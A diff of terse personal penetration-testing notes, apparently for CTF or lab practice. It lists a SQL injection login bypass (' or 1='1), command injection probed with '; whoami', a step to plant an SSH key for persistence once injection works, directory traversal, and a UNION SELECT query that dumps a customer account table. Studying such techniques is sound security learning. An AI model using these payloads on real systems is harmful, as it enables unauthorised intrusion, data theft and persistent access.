@@ -52,6 +52,7 @@ if i use nikto proxychains redirect to 2>/dev/null
 nikto -h ip 
 might not work
 
+WEB STUFF
 
 firefox to website
 login page ' or 1='1 (check spaces) for username passwd 
@@ -66,6 +67,11 @@ only encode is rot13 /base64
 
 cmd injection if ; whoami doesnt work then it dont work
 if it does work upload ssh key immediately
+
+IF IT WORKS=============================================
+KEYGEN
+ssh-keygen
+
 
 ``````
 directory traversal
@@ -117,9 +123,6 @@ siteusers  |   customer  |  name
 
 
 product=7 UNION SELECT name,description,account FROM siteusers.customer;
-
-``````````````````````````````````````````````````````````````````````````````````
-SSH KEYGEN - FILE UPLOAD
 
 
 
